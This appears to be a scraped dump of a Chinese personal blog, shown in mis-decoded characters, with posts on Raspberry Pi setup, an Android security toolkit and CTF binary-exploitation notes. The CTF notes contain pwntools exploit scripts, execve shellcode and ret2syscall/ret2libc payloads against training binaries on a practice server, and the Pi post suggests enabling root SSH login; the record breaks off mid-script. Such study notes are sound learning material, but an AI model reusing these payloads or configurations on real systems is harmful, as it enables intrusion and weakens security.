ç»ˆäºä¸‹æ‰‹ä¹°äº†ã€‚æ‰“ç®—ç”¨æ¥å­¦ä¹ ARMã€ä»¥åŠä¸€äº›ç¡¬ä»¶çš„çŸ¥è¯†ã€‚\n3B+ è£¸æœº\n32G SD card\næ•£çƒ­ç‰‡\nä¿æŠ¤å£³\n0x01 å®‰è£…ç³»ç»Ÿ é¦–å…ˆä¸‹è½½ç³»ç»Ÿé•œåƒã€‚\nå®˜ç½‘æœ‰æŒºå¤šç³»ç»Ÿå¯ä»¥é€‰æ‹©ï¼Œè¿™é‡Œé€‰æ‹©äº†å®‰è£…Raspbian desktopæœ€æ–°ç‰ˆ\nä¹‹åæ‰“ç®—è£…Liteç‰ˆï¼Œæ‰‹ä¸Šæ²¡æœ‰å¤šä½™çš„æ˜¾ç¤ºå™¨ã€‚è€Œä¸”æ¡Œé¢ç‰ˆå ç”¨å¾ˆé«˜ã€‚\nè¿…é›·ï¼Œ3åˆ†é’Ÿæå®šã€‚\nå…¶æ¬¡å¼€å§‹å‘SDå¡ä¸­å†™é•œåƒã€‚\nä¹°çš„32Gé—ªè¿ªçš„é«˜é€Ÿå¡ï¼Œç°åœ¨32Géƒ½ç™½èœä»·äº†ï¼Œæƒ³æƒ³å‡ å¹´å‰16Gçš„æ­»è´µã€‚\nå®˜æ–¹æ•™ç¨‹ç”¨çš„æ˜¯Etcher ï¼Œä¹Ÿå¯ä»¥ç”¨Win32DiskImagerã€‚è¿™é‡Œçœäº‹è¿˜æ˜¯ç”¨Etcherã€‚\næ­¥éª¤\nä¸‹è½½etcher.ioå®‰è£…åŒ…å®‰è£…Etcher](https://etcher.io/)\nè¿è¡ŒEtcher,é€‰æ‹©é•œåƒå’Œsdå¡\nFlashä¸€é”®æå®šã€‚ 0x02 é…ç½® ç³»ç»Ÿå®‰è£…å®Œï¼Œå¼€å§‹è¿›è¡Œé…ç½®ã€‚\nå…ˆè¿ä¸Šæ˜¾ç¤ºå™¨çœ‹çœ‹\nç„¶è€Œå¹³æ—¶æ˜¾ç¤ºå™¨è¿˜æ˜¯è¦è¿ç¬”è®°æœ¬ï¼Œè€Œä¸”è¿™åˆ†è¾¨ç‡å¥½ç³Šã€‚æ‰€ä»¥è¿˜æ˜¯é…sshå’ŒVNCè¿æ¥ä½¿ç”¨å§ã€‚\nä¿®æ”¹æº 1 2 3 4 5 6 # ç¼–è¾‘ `/etc/apt/sources.list` æ–‡ä»¶ï¼Œåˆ é™¤åŸæ–‡ä»¶æ‰€æœ‰å†…å®¹ï¼Œç”¨ä»¥ä¸‹å†…å®¹å–ä»£ï¼š deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main non-free contrib deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main non-free contrib # ç¼–è¾‘ `/etc/apt/sources.list.d/raspi.list` æ–‡ä»¶ï¼Œåˆ é™¤åŸæ–‡ä»¶æ‰€æœ‰å†…å®¹ï¼Œç”¨ä»¥ä¸‹å†…å®¹å–ä»£ï¼š deb http://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ stretch main sudo apt update\næ‹“å±•SDå¡ sudo raspi-config -\u0026gt; Advanced Opt -\u0026gt; A1 Expand Filesystem\nssh é…ç½® æœ€æ–°ç‰ˆç³»ç»Ÿç›´æ¥æƒ³è¦çš„æ¥å£æ‰“å¼€å°±OK\nå…è®¸rootç™»é™†ï¼Œä¿®æ”¹/etc/ssh/sshd.conf ä¸‹çš„PermitRootLogin yes StrictModes yes å°±okã€‚\nVNC win10ä¸‹è½½vncå®¢æˆ·ç«¯\nRaspberryPI å‘½ä»¤å¼€å¯server:vncserver\nè¿æ¥æˆåŠŸï¼š\nè¿æ¥å‡ºç°åˆ†è¾¨ç‡é—®é¢˜\nè®¾ç½®åˆ†è¾¨ç‡ï¼šå‘½ä»¤sudo raspi-config-\u0026gt;Advanced Opt -\u0026gt;Resolutioné€‰æ‹©åˆ†è¾¨ç‡ã€‚é‡å¯å°±å®Œäº‹ã€‚\n0x04 ç¡¬ä»¶æ£€æŸ¥ ç³»ç»Ÿé•œåƒç‰ˆæœ¬å· æ¿å­å‹å·ï¼š ç³»ç»Ÿå›ºä»¶ç‰ˆæœ¬å· çœ‹çœ‹ç¡¬ä»¶ï¼š\nusb cpu è¯´å¥½çš„v8?\nç½‘å¡ 0x05 æ€»ç»“ é—²äº†å¾ˆä¹…ï¼Œç°åœ¨ç»ˆäºåŠ¨æ‰‹æè‡ªå·±æƒ³æçš„ä¸œè¥¿ï¼ŒèŠ±äº†ä¸€ä¸ªæ™šä¸Šï¼Œæå®Œè¿™äº›ç®€å•çš„å®‰è£…é…ç½®ï¼ŒæŒºè´¹æ—¶è´¹åŠ›çš„ï¼Œä¸è¿‡è‡ªå·±å¼€å¿ƒå°±å¥½ã€‚æœ€å¥½æ˜¯è‡ªå·±èƒ½å¤ŸåšæŒä¸‹å»ï¼Œåšæ›´å¤šæœ‰è¶£çš„äº‹ã€‚\n12\n","date":"2019-06-23T00:00:00+08:00","permalink":"https://ykiko.top/p/raspberry_pi_3b-_0%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/","title":"Raspberry_Pi_3B+_0å®‰è£…ä½¿ç”¨"},{"content":"MobSecVM 0x00 å‰è¨€ æœ€è¿‘ä¸çŸ¥ä¸ºä½•VM-Ubuntuç‚¸äº†ï¼Œè¯•äº†å„ç§æ–¹æ³•ï¼ŒæŠ˜è…¾äº†å¾ˆä¹…ä¹‹åï¼Œç»ˆäºæ¢å¤äº†ã€‚åˆæµªè´¹æ—¶é—´å’Œç¯å¢ƒæ–—å¿—æ–—å‹‡ã€‚è‡ªæ­¤æ‰“ç®—è‡ªå·±å¼„ä¸€ä¸ªåŒ…å«äº†Androidå®‰å…¨æ‰€éœ€å„ç§å·¥å…·çš„ç¯å¢ƒï¼Œåšä¸ªå¤‡ä»½ã€‚é˜²æ­¢å“ªå¤©åˆå‡ºå„ç§å„æ ·çš„é—®é¢˜ã€‚\né¡¹ç›®åœ°å€ï¼šMobSecVM\nä¸‹è½½åœ°å€ï¼šbaiduyunã€google_yun\n0x01 ç¯å¢ƒå‡†å¤‡ Ubuntu 18.04 LTS Usernameï¼šmobsec\nPasswordï¼šmobsec Vmware 15 0x02 Tools ï¼ˆä¸æ–­è¡¥å……ï¼‰ [x] AndroidStudio å¼€å‘å…¨å®¶æ¡¶å¸¦æ¨¡æ‹Ÿå™¨\n[x] Radare2 é€†å‘æ¡†æ¶\nFrida Hookå·¥å…·\nDrozer Androidåº”ç”¨ç¨‹åºå®‰å…¨è¯„ä¼°æ¡†æ¶\nAPKtool APKé€†å‘å·¥å…·\nBurpSuite æŠ“æ”¹åŒ…ï¼Œå®‰å…¨æ£€æµ‹\nWireshare æŠ“åŒ…å·¥å…·\n[x] MobSF åº”ç”¨ç¨‹åºè‡ªåŠ¨åŒ–åˆ†ææ¡†æ¶\n[] androguard ä¸€æ¬¾åŸºäºpythonçš„é€†å‘å·¥ç¨‹ï¼Œæ¶æ„è½¯ä»¶å’Œè½¯ä»¶åˆ†æAndroidåº”ç”¨ç¨‹åºçš„æ¡†æ¶ã€‚\n[x] VScode ç¼–è¾‘å™¨\n[] bytecode-viewer\n[] barfâ€“project\n[x] jadx Dex to Java decompiler\nMARA_Framework Mobile Application Reverse engineering and Analysis Framework.\nAndroBugs Framework Android vulnerability scanner\nqark Tool to look for several security related Android application vulnerabilities\nDIVA Damn Insecure and vulnerable App for Android\nInsecureBankv2 Vulnerable Android application for developers and security enthusiasts to learn about Android insecurities\nAndroid Security Sandbox An app showcase of some techniques to improve Android app security\nGoatDroid A fully functional and self-contained training environment for educating developers and testers on Android security\nsievePWN An android application which exploits sieve through android components.\n0x03 å°æ’ä»¶ on_my_zsh\nFindBugs-IDEA\ndocker\n0x04 æ•ˆæœå›¾ ","date":"2019-06-16T00:00:00+08:00","permalink":"https://ykiko.top/p/mobsecvm/","title":"MobSecVM"},{"content":"PWN-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´(FMT) 0x00 ç®€ä»‹ ","date":"2019-04-12T00:00:00+08:00","permalink":"https://ykiko.top/p/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9Efmt/","title":"PWN-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´(FMT)"},{"content":"FuzzingåŸºç¡€(å¾…è¡¥å……) 0x00 ","date":"2019-04-10T00:00:00+08:00","permalink":"https://ykiko.top/p/fuzzing%E5%9F%BA%E7%A1%80%E5%BE%85%E8%A1%A5%E5%85%85/","title":"FuzzingåŸºç¡€(å¾…è¡¥å……)"},{"content":"CTF-PWNåˆ·é¢˜è®°å½•-CTFWiki_3å †åˆ©ç”¨ï¼ˆå¾…è¡¥å……ï¼‰ ç®€ä»‹ ","date":"2019-04-04T00:00:00+08:00","permalink":"https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_3%E5%A0%86%E5%88%A9%E7%94%A8%E5%BE%85%E8%A1%A5%E5%85%85/","title":"CTF-PWNåˆ·é¢˜è®°å½•-CTFWiki_3å †åˆ©ç”¨ï¼ˆå¾…è¡¥å……ï¼‰"},{"content":"PWN-OOB(é‡å†™ä¸­) 0x00 ç®€ä»‹ ","date":"2019-03-25T00:00:00+08:00","permalink":"https://ykiko.top/p/pwn-oob%E9%87%8D%E5%86%99%E4%B8%AD/","title":"PWN-OOB(é‡å†™ä¸­)"},{"content":"CTF-PWNåˆ·é¢˜è®°å½•-CTFWiki_2æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆå¾…è¡¥å……ï¼‰ ç®€ä»‹ ","date":"2019-03-22T00:00:00+08:00","permalink":"https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_2%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%BE%85%E8%A1%A5%E5%85%85/","title":"CTF-PWNåˆ·é¢˜è®°å½•-CTFWiki_2æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆå¾…è¡¥å……ï¼‰"},{"content":"PWN-UAF_ï¼ˆé‡å†™ï¼‰ 0x00 åŸç† å †å†…å­˜åœ¨é‡Šæ”¾åè¢«ç›´æ¥å†æ¬¡ä½¿ç”¨(é‡Šæ”¾äº†å †å—ä¹‹åï¼Œæœªå°†è¯¥æŒ‡é’ˆå€¼ä¸ºNULL,å¯¼è‡´æŒ‡é’ˆå¤„äºæ‚¬ç©ºçŠ¶æ€ï¼Œè¢«é‡Šæ”¾çš„å†…å­˜èƒ½è¢«æ¶æ„åˆ©ç”¨) åœ¨æµè§ˆå™¨ä¸­æ¯”è¾ƒå¸¸è§çš„æ¼æ´\næ ¹æœ¬åŸå› æ˜¯ï¼š\nåº”ç”¨ç¨‹åºè°ƒç”¨free()é‡Šæ”¾å†…å­˜æ—¶ï¼Œå¦‚æœå†…å­˜å—å°äº256kbï¼Œdlmallocå¹¶ä¸é©¬ä¸Šå°†å†…å­˜å—é‡Šæ”¾å›å†…å­˜ï¼Œè€Œæ˜¯å°†å†…å­˜å—æ ‡è®°ä¸ºç©ºé—²çŠ¶æ€ã€‚è¿™ä¹ˆåšçš„åŸå› æœ‰ä¸¤ä¸ªï¼šä¸€æ˜¯å†…å­˜å—ä¸ä¸€å®šèƒ½é©¬ä¸Šé‡Šæ”¾ä¼šå†…æ ¸ï¼ˆæ¯”å¦‚å†…å­˜å—ä¸æ˜¯ä½äºå †é¡¶ç«¯ï¼‰ï¼ŒäºŒæ˜¯ä¾›åº”ç”¨ç¨‹åºä¸‹æ¬¡ç”³è¯·å†…å­˜ä½¿ç”¨ï¼ˆè¿™æ˜¯ä¸»è¦åŸå› ï¼‰ã€‚å½“dlmallocä¸­ç©ºé—²å†…å­˜é‡è¾¾åˆ°ä¸€å®šå€¼æ—¶dlmallocæ‰å°†ç©ºé—²å†…å­˜é‡Šæ”¾ä¼šå†…æ ¸ã€‚å¦‚æœåº”ç”¨ç¨‹åºç”³è¯·çš„å†…å­˜å¤§äº256kbï¼Œdlmallocè°ƒç”¨mmap()å‘å†…æ ¸ç”³è¯·ä¸€å—å†…å­˜ï¼Œè¿”å›è¿”è¿˜ç»™åº”ç”¨ç¨‹åºä½¿ç”¨ã€‚å¦‚æœåº”ç”¨ç¨‹åºé‡Šæ”¾çš„å†…å­˜å¤§äº256kbï¼Œdlmallocé©¬ä¸Šè°ƒç”¨munmap()é‡Šæ”¾å†…å­˜ã€‚dlmallocä¸ä¼šç¼“å­˜å¤§äº256kbçš„å†…å­˜å—ï¼Œå› ä¸ºè¿™æ ·çš„å†…å­˜å—å¤ªå¤§äº†ï¼Œæœ€å¥½ä¸è¦é•¿æœŸå ç”¨è¿™ä¹ˆå¤§çš„å†…å­˜èµ„æºã€‚\nåˆ©ç”¨ ç®€å•åˆ©ç”¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; typedef void (*func_ptr)(char *); void evil_fuc(char command[]) { system(command); } void echo(char content[]) { printf(\u0026#34;%s\u0026#34;,content); } int main() { func_ptr *p1=(func_ptr*)malloc(4*sizeof(int)); printf(\u0026#34;malloc addr: %p\\n\u0026#34;,p1); p1[3]=echo; p1[3](\u0026#34;hello world\\n\u0026#34;); free(p1); //åœ¨è¿™é‡Œfreeäº†p1,ä½†å¹¶æœªå°†p1ç½®ç©º,å¯¼è‡´åç»­å¯ä»¥å†ä½¿ç”¨p1æŒ‡é’ˆ p1[3](\u0026#34;hello again\\n\u0026#34;); //p1æŒ‡é’ˆæœªè¢«ç½®ç©º,è™½ç„¶freeäº†,ä½†ä»å¯ä½¿ç”¨. func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//mallocåœ¨freeä¸€å—å†…å­˜å,å†æ¬¡ç”³è¯·åŒæ ·å¤§å°çš„æŒ‡é’ˆä¼šæŠŠåˆšåˆšé‡Šæ”¾çš„å†…å­˜åˆ†é…å‡ºæ¥. printf(\u0026#34;malloc addr: %p\\n\u0026#34;,p2); printf(\u0026#34;malloc addr: %p\\n\u0026#34;,p1);//p2ä¸p1æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä¸ºåŒä¸€åœ°å€ p2[3]=evil_fuc; //åœ¨è¿™é‡Œå°†p1æŒ‡é’ˆé‡Œé¢ä¿å­˜çš„echoå‡½æ•°æŒ‡é’ˆè¦†ç›–æˆä¸ºäº†evil_funcæŒ‡é’ˆ. p1[3](\u0026#34;/bin/sh\u0026#34;); return 0; } pwnable.kr uaf å…ˆçœ‹çœ‹æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;cstdlib\u0026gt; #include \u0026lt;unistd.h\u0026gt; using namespace std; class Human{ private: virtual void give_shell(){ system(\u0026#34;/bin/sh\u0026#34;); } protected: int age; string name; public: virtual void introduce(){ cout \u0026lt;\u0026lt; \u0026#34;My name is \u0026#34; \u0026lt;\u0026lt; name \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;I am \u0026#34; \u0026lt;\u0026lt; age \u0026lt;\u0026lt; \u0026#34; years old\u0026#34; \u0026lt;\u0026lt; endl; } }; class Man: public Human{ public: Man(string name, int age){ this-\u0026gt;name = name; this-\u0026gt;age = age; } virtual void introduce(){ Human::introduce(); cout \u0026lt;\u0026lt; \u0026#34;I am a nice guy!\u0026#34; \u0026lt;\u0026lt; endl; } }; class Woman: public Human{ public: Woman(string name, int age){ this-\u0026gt;name = name; this-\u0026gt;age = age; } virtual void introduce(){ Human::introduce(); cout \u0026lt;\u0026lt; \u0026#34;I am a cute girl!\u0026#34; \u0026lt;\u0026lt; endl; } }; int main(int argc, char* argv[]){ Human* m = new Man(\u0026#34;Jack\u0026#34;, 25); Human* w = new Woman(\u0026#34;Jill\u0026#34;, 21); size_t len; char* data; unsigned int op; while(1){ cout \u0026lt;\u0026lt; \u0026#34;1. use\\n2. after\\n3. free\\n\u0026#34;; cin \u0026gt;\u0026gt; op; switch(op){ case 1: m-\u0026gt;introduce(); w-\u0026gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout \u0026lt;\u0026lt; \u0026#34;your data is allocated\u0026#34; \u0026lt;\u0026lt; endl; break; case 3: delete m; delete w; break; default: break; } } return 0; } HCFt2016 fheap ç½‘é¼æ¯CTF2018 ç¬¬ä¸€åœº Pwn Babyheap å‚è€ƒèµ„æ–™ï¼š\nhttps://www.cnblogs.com/Ox9A82/p/5320857.html\nhttps://www.cnblogs.com/alert123/p/4918041.html\nhttps://blog.csdn.net/qq_31481187/article/details/73612451\nhttps://www.anquanke.com/post/id/85281\nhttps://xz.aliyun.com/t/2609?accounttraceid=ce44f2b3-4957-4509-b7ba-f2bd6eed34d3#toc-4\nhttps://www.anquanke.com/post/id/85281\n","date":"2019-03-20T00:00:00+08:00","permalink":"https://ykiko.top/p/pwn-uaf_%E9%87%8D%E5%86%99/","title":"PWN-UAF_ï¼ˆé‡å†™ï¼‰"},{"content":"PWN-å †æº¢å‡º_(å¾…è¡¥å……) 0x00 ç®€ä»‹ 0x01 åŸºç¡€çŸ¥è¯† ","date":"2019-03-16T00:00:00+08:00","permalink":"https://ykiko.top/p/pwn-%E5%A0%86%E6%BA%A2%E5%87%BA_%E5%BE%85%E8%A1%A5%E5%85%85/","title":"PWN-å †æº¢å‡º_(å¾…è¡¥å……)"},{"content":"PWN-æ ˆæº¢å‡ºï¼ˆå¾…è¡¥å……ï¼‰ 0x00 ç®€ä»‹ 0x01 åŸºç¡€çŸ¥è¯† ","date":"2019-03-10T00:00:00+08:00","permalink":"https://ykiko.top/p/pwn-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%BE%85%E8%A1%A5%E5%85%85/","title":"PWN-æ ˆæº¢å‡ºï¼ˆå¾…è¡¥å……ï¼‰"},{"content":"ROPç»ƒä¹ (ç©º) é¢˜ç›®åˆ—è¡¨ï¼š IP:47.106.212.155 ret2libc3\n10008\nret2shellcode\n10002\nret2libc\n10005\ntrain.cs.nctu.edu.tw: rop\n2013-PlaidCTF-ropasaurusrex\nDefcon 2015 Qualifier: R0pbaby\n10012\ntrain.cs.nctu.edu.tw: ret2libc\nAliCTF 2016ï¼švss\nRCTF2015-welpwn\n10010\nlctf16-pwn100\n10011\nxdctf15-pwn200\n10013\nWPï¼ˆæŒç»­æ›´æ–°ï¼‰ï¼š\n","date":"2019-02-28T00:00:00+08:00","permalink":"https://ykiko.top/p/rop%E7%BB%83%E4%B9%A0%E7%A9%BA/","title":"ROPç»ƒä¹ (ç©º)"},{"content":"CTF-PWNåˆ·é¢˜è®°å½•-CTFWiki_1æ ˆæº¢å‡º çœ‹CTFWikiæ¥å…¥é—¨CTF-PWN (Linuxå’Œarm) åšä¸ªè®°å½•\nçŸ¥è¯†ç‚¹ï¼šPWNç›¸å…³çŸ¥è¯†ç‚¹æ€»ç»“\nLinux PWN\nARM PWN\né¢˜ç›®å…¨éƒ¨æ¥æºäº CTFWiki ä¸Šæ‰€æ¶‰åŠé¢˜ç›®\nLinux PWN å¤§éƒ¨åˆ†åŸç†å‚è€ƒCTFWiki\næ ˆæº¢å‡º åŸºæœ¬æ ˆæº¢å‡º 1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void success() { puts(\u0026#34;You Hava already controlled it.\u0026#34;); } void vulnerable() { char s[12]; gets(s); puts(s); return; } int main(int argc, char **argv) { vulnerable(); return 0; } 1 2 3 4 5 6 7 8 # gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1 stack1.c: In function â€˜vulnerableâ€™: stack1.c:6:3: warning: implicit declaration of function â€˜getsâ€™; did you mean â€˜fgetsâ€™? [-Wimplicit-function-declaration] gets(s); ^~~~ fgets /tmp/ccNeCYTO.o: In function `vulnerable\u0026#39;: stack1.c:(.text+0x45): warning: the `gets\u0026#39; function is dangerous and should not be used. echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space\nå…³é—­å®Œå…¨éƒ¨ä¿æŠ¤\næ­¥éª¤ï¼šæŸ¥çœ‹gets()å†™å…¥çš„åœ°å€è·ç¦»ebpçš„é•¿åº¦ï¼ˆè®¡ç®—å¡«å……é•¿åº¦ï¼‰-\u0026gt;+ebpçš„é•¿åº¦-\u0026gt;+è¿”å›çš„åœ°å€ï¼ˆsuccess()çš„åœ°å€)\npoc1.py\n1 2 3 4 5 6 7 8 9 10 11 #coding=utf-8 from pwn import * # sh = process(\u0026#34;./stack1\u0026#34;) sh = remote(\u0026#34;47.106.212.155\u0026#34;,10000) success_addr = 0x08048456 payload = \u0026#39;a\u0026#39;*0x14 + \u0026#39;bbbb\u0026#39; + p32(success_addr) sh.sendline(payload) sh.interactive() åŸºæœ¬ROP ROP æ”»å‡»ä¸€èˆ¬å¾—æ»¡è¶³å¦‚ä¸‹æ¡ä»¶\nç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚\nå¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ gadgets ä»¥åŠç›¸åº” gadgets çš„åœ°å€ã€‚\nret2text ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text)ã€‚\nç¤ºä¾‹ç¨‹åºï¼šret2text\næ‰€ä»¥åªéœ€retåˆ°0x0804863aå°±èƒ½getshell\næ„é€ payload\nè®¡ç®—åç§»é‡\nä½¿ç”¨ragg2 ragg2 -P 200 -r \u0026gt; pattern.txt or ragg2 -P 200 -rå¤åˆ¶ä¸‹æ¥\n1 2 # ragg2 -P 200 -r AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA# profile.rr2:\n1 2 #!/usr/bin/rarun2 stdin=./pattern.txt r2 -R profile.rr2 -d ret2text or ç›´æ¥r2 -d ret2text\ndcåè¾“å…¥å¤åˆ¶çš„patternå­—ç¬¦ä¸²\nwopO eipå¾—åˆ°åç§»\ngdbæ‰‹åŠ¨è®¡ç®—\nä¸‹æ–­ç‚¹callå¤„ï¼š0x080486ae\næ‰€ä»¥åç§»ä¸º108+4\npython pattern.py\npayload\n1 2 3 4 5 6 7 8 from pwn import * # sh = process(./ret2text) sh = remote(\u0026#34;47.106.212.155\u0026#34;,10001) binsh = 0x0804863a payload = 112*\u0026#39;A\u0026#39; + p32(binsh) sh.sendline(payload) sh.interactive() ret2shellcode ret2shellcode\nè¿è¡Œæ—¶shellcodeæ‰€åœ¨åŒºåŸŸåº”å…·æœ‰å¯æ‰§è¡Œæƒé™ strncpyå‡½æ•°å°†getsçš„å†…å®¹å¤åˆ¶åˆ°buf2 bufå­˜æ”¾åˆ°.bssæ®µçš„[0x804a080:4]ä½ç½®ã€‚\nè°ƒè¯•çœ‹æ‰€åœ¨.bssæ®µæ˜¯å¦æœ‰æ‰§è¡Œçš„æƒé™ã€‚\npayload:\n1 2 3 4 5 6 7 8 9 10 11 #coding:utf-8 from pwn import * # context(log_level = \u0026#39;debug\u0026#39;,arch =\u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39; ) # sh = process(./ret2shellcode) sh = remote(\u0026#34;47.106.212.155\u0026#34;,10002) ## è·å¾—system(\u0026#34;bin/sh\u0026#34;)çš„asm shellcode = asm(shellcraft.sh()) buf2_addr = 0x804a080 # sh.sendline(shellcode+\u0026#34;\\x90\u0026#34;*(112-len(shellcode))+p32(buf2_addr)) sh.sendline(shellcode.ljust(112,\u0026#34;A\u0026#34;)+p32(buf2_addr)) sh.interactive() ç»ƒä¹ é¢˜ï¼šsniperoj-pwn100-shellcode-x86-64\nåç§»ï¼švar void *buf @ rbp-0x10 shellcodeå¯ç”¨ç©ºé—´ï¼š16+8=24\næ‰¾shellcode https://www.exploit-db.com/\nhttp://shell-storm.org/shellcode/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 .global _start _start: # char *const argv[] xorl %esi, %esi # \u0026#39;h\u0026#39; \u0026#39;s\u0026#39; \u0026#39;/\u0026#39; \u0026#39;/\u0026#39; \u0026#39;n\u0026#39; \u0026#39;i\u0026#39; \u0026#39;b\u0026#39; \u0026#39;/\u0026#39; movq $0x68732f2f6e69622f, %rbx # for \u0026#39;\\x00\u0026#39; pushq %rsi pushq %rbx pushq %rsp # const char *filename popq %rdi # __NR_execve 59 pushq $59 popq %rax # char *const envp[] xorl %edx, %edx syscall */ /* gcc -z execstack push64.c uname -r 3.19.3-3-ARCH */ shellcode = \u0026#34;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\u0026#34; \u0026#34;\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\u0026#34;; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #coding:utf-8 from pwn import * # context(log_level = \u0026#39;debug\u0026#39;,arch =\u0026#39;x64\u0026#39;,os = \u0026#39;linux\u0026#39; ) io = process(\u0026#39;./shellcode\u0026#39;) # io = remote(\u0026#34;47.106.212.155\u0026#34;,10003) shellcode = \u0026#34;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\u0026#34; io.recvuntil(\u0026#39;[\u0026#39;) buf_addr = io.recvuntil(\u0026#39;]\u0026#39;,drop=True) buf_addr = int(buf_addr,16) # print(buf_addr) payload = \u0026#34;A\u0026#34;*24 + p64(buf_addr+32) + shellcode # 32æ˜¯24å­—èŠ‚çš„å¡«å……æ•°æ®é•¿åº¦åŠ è¿”å›åœ°å€é•¿åº¦24+8 print payload io.sendline(payload) io.interactive() ret2syscall æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨\nret2syscall\nç›¸å¯¹ebpçš„åç§»ä¸º0x64=108 è¦†ç›–èŒƒå›´ä¸º+4=112\næ²¡æ³•ret2text,ä¹Ÿæ²¡æ³•ret2shellcode\nåªæœ‰ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨æ¥getshellã€‚æ‰§è¡Œ int 0x80å³å¯æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨\n1 execve(\u0026#34;/bin/sh\u0026#34;,NULL,NULL) ä½¿ç”¨ROPgadgetå¯»æ‰¾gadgets\nè¿™æ ·å°±èƒ½å¤Ÿæ§åˆ¶åˆ°eax,ebx,ecx,edxå¯„å­˜å™¨ã€‚\nå†™payload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #coding:utf-8 from pwn import * # context(log_level = \u0026#39;debug\u0026#39;,arch =\u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39; ) # io = process(./ret2syscall) io = remote(\u0026#34;47.106.212.155\u0026#34;,10004) pop_eax_addr = 0x080bb196 pop_ebcdx_addr = 0x0806eb90 int_0x80_addr = 0x08049421 bin_sh_addr = 0x080BE408 payload = flat( [\u0026#34;A\u0026#34;*112,pop_eax_addr,0xb,pop_ebcdx_addr,0,0,bin_sh_addr,int_0x80_addr] ) io.sendline(payload) io.interactive() ret2libc ret2libc å³æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ libc ä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ plt å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® (å³å‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹)ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œ system(â€œ/bin/shâ€)ï¼Œæ•…è€Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦çŸ¥é“ system å‡½æ•°çš„åœ°å€ã€‚\neg1: ret2libc1\n1 2 3 4 5 6 7 8 9 10 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(\u0026#34;RET2LIBC \u0026gt;_\u0026lt;\u0026#34;); gets(\u0026amp;s); return 0; } exp1:\n1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * # io = process(\u0026#39;./ret2libc1\u0026#39;) io = remote(\u0026#34;47.106.212.155\u0026#34;,10006) binsh_addr = 0x08048720 sym_plt_addr = 0x08048460 payload = 